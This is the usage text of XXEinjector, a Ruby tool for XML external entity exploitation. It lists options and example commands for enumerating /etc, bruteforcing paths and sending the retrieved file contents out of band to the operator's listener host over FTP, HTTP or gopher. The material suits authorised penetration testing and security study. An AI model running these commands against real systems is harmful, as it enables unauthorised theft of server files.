XXEinjector by Jakub Palaczynski

XXEinjector automates retrieving files using out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications.

Options:
  --host	Mandatory - our IP address for reverse connections. (--host=192.168.0.2)
  --path	Mandatory (or --brute) - Path to enumerate. (--path=/etc)
  --file	Mandatory - File containing HTTP request. Entity in request file needs to point to file.dtd on XXEinjector HTTP server. Issue --xml to show sample HTTP request. (--file=/tmp/req.txt)
  --brute	Mandatory (or --path) - File with paths to bruteforce. (--brute=/tmp/brute.txt)

  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)
  --phpfilter		Use PHP filter to base64 encode target file before sending.

  --ssl		Use SSL.
  --proxy	Proxy to use. (--proxy=127.0.0.1:8080)
  --httpport	Set custom HTTP port. (--httpport=80)
  --ftpport	Set custom FTP port. (--ftpport=21)
  --gopherport	Set custom gopher port. (--gopherport=70)

  --timeout	Timeout for receiving file/directory content. (--timeout=20)
  --fast	Skip asking what to enumerate. Prone to false-positives.
  --verbose	Show verbose messages.

Example usage:
  Enumerating /etc directory using HTTPS protocol with proxy:
  ruby XXEinjector-github.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl --proxy=127.0.0.1:8080
  Enumerating /etc directory using HTTP protocol:
  ruby XXEinjector-github.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt
  Bruteforcing files:
  ruby XXEinjector-github.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt
